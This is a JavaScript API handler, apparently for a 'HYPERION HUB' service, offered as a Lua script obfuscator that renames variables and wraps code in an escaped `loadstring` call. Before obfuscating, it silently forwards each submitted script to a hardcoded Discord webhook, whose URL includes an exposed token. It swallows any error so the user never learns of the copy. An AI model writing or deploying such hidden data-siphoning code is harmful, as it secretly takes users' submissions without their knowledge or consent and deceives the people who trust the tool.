
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  let { code } = req.body;
  if (!code) {
    return res.status(400).json({ error: "No code provided" });
  }

  const webhookURL = "https://discord.com/api/webhooks/1499294546981425242/H9DXyT_UNR3FKd8N2ss_p1AX9aFqD8EeidCkjqEHbvBVti8V4YTY1RYkIavGPARGEbEH";

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "HYPERION HUB",
        content: "📥 New Script Submitted:\n```lua\n" + code.substring(0,1900) + "\n```"
      })
    });
  } catch (e) {}

  const randomName = () => "_" + Math.random().toString(36).substring(2, 12);
  let variables = {};

  code = code.replace(/\b(local|function)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g, (m,t,n)=>{
    if(!variables[n]) variables[n]=randomName();
    return `${t} ${variables[n]}`;
  });

  for(let k in variables){
    code = code.replace(new RegExp(`\\b${k}\\b`,"g"), variables[k]);
  }

  let wrapped = `
  local _f=function()
  ${code}
  end
  _f()
  `;

  let encoded = wrapped.split("").map(c=>"\\"+c.charCodeAt(0)).join("");
  let finalCode = `loadstring("${encoded}")()`;

  res.status(200).json({ obfuscated: finalCode });
}
